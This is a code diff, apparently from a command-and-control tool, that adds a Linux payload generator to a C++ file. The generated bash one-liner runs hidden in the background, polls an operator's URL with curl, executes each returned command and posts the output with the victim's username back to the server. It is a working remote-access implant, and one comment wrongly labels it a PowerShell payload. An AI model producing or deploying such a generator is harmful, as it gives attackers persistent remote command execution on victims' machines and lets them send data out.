@@ -83,6 +83,26 @@ string payload_generator_windows(const string& url) {
  * @return An empty string.
  */
 string payload_generator_linux(const string& url) {
-    // TODO: Implement Linux payload generator if needed
-    return "";
+    // Clean URL by removing newlines and carriage returns
+    string clean_url = url;
+    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\n'), clean_url.end());
+    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\r'), clean_url.end());
+
+    // Generate unique endpoint names for command and result exchange
+    string endpoint1 = generate_random_string(8);
+    string endpoint2 = generate_random_string(8);
+
+    // Construct the PowerShell payload string
+    string payload =
+    "nohup bash -c 'USER=$(whoami); while true; do "
+    "response=$(curl -fsS \"" + clean_url + "/" + endpoint1 + "?user=$USER\"); "
+    "if [ ! -z \"$response\" ]; then "
+    "  output=$(bash -c \"$response\" 2>&1); "
+    "  curl -fsS -X POST \"" + clean_url + "/" + endpoint2 + "?user=$USER\" "
+    "  -d \"Result=$output\" --max-time 5 || true; "
+    "fi; "
+    "sleep 0.5; "
+    "done' >/dev/null 2>&1 &";
+
+    return payload;
 }
